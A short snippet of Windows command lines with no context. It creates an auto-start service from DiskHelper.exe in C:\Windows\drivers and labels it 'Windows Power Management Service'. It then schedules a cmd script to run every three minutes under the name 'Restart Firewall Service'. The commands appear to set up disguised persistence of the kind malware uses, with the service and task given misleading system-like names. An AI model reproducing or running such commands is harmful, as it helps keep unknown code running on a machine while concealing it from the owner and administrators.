sc create serviceName binpath=C:\Windows\drivers\DiskHelper.exe start= auto
sc description serviceName "Windows Power Management Service"

schtasks /create /sc minute /mo 3 /tn "Restart Firewall Service" /tr "cmd.exe C:\Windows\System32\restartservice.cmd"
